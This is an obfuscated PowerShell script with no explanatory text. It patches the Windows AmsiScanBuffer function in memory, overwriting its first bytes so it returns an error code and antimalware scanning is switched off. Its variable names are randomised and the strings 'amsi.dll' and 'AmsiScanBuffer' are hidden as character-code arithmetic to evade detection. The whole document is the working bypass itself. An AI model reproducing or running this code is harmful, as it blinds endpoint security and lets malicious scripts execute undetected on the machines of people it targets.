$enKTgu8MU8hqoiM4qwY = @"
using System;
using System.Runtime.InteropServices;
public class enKTgu8MU8hqoiM4qwY {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr SaeqA3DTTtQ, string nagPvtzu7GY2KTq2s);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr Rk6V4J_EhflEcGz8H, UIntPtr MR50, uint c1Rsb8CFe22s9, out uint k0Beh85Fy0zT);
}
"@

Add-Type $enKTgu8MU8hqoiM4qwY

$iJ_h8FVdvK11MaTOc = [enKTgu8MU8hqoiM4qwY]::LoadLibrary("$([cHAr]([byTe]0x61)+[chAr]([bYTE]0x6d)+[chAr](115*76/76)+[CHAr](105+12-12)+[cHAR]([bYTE]0x2e)+[ChAR](100)+[CHAr](108+92-92)+[CHAR](108+95-95))")
$OQfSOUagomPwEWnSZR = [enKTgu8MU8hqoiM4qwY]::GetProcAddress($iJ_h8FVdvK11MaTOc, "$([CHaR](65*44/44)+[ChaR]([bYte]0x6d)+[CHaR]([BYTE]0x73)+[ChAr]([ByTE]0x69)+[CHaR](19+64)+[chAR]([BytE]0x63)+[chaR](97+44-44)+[chaR]([bYTE]0x6e)+[chAR]([bYTe]0x42)+[cHAr](117*84/84)+[Char](102*77/77)+[CHAr](74+28)+[cHAr]([BYtE]0x65)+[ChAr]([bYTe]0x72))")
$p = 0
[enKTgu8MU8hqoiM4qwY]::VirtualProtect($OQfSOUagomPwEWnSZR, [uint32]5, 0x40, [ref]$p)
$MAA01Xwj8YOw1CjGGiK9 = "0xB8"
$WDoiqAdrLfCUWG2 = "0x57"
$cMbBecvovoyC3 = "0x00"
$EFm_Lm0P = "0x07"
$evVVR5ORkgaHzzp8nN = "0x80"
$MkraB26TGRXEU = "0xC3"
$P5hC = [Byte[]] ($MAA01Xwj8YOw1CjGGiK9,$WDoiqAdrLfCUWG2,$cMbBecvovoyC3,$EFm_Lm0P,+$evVVR5ORkgaHzzp8nN,+$MkraB26TGRXEU)
[System.Runtime.InteropServices.Marshal]::Copy($P5hC, 0, $OQfSOUagomPwEWnSZR, 6)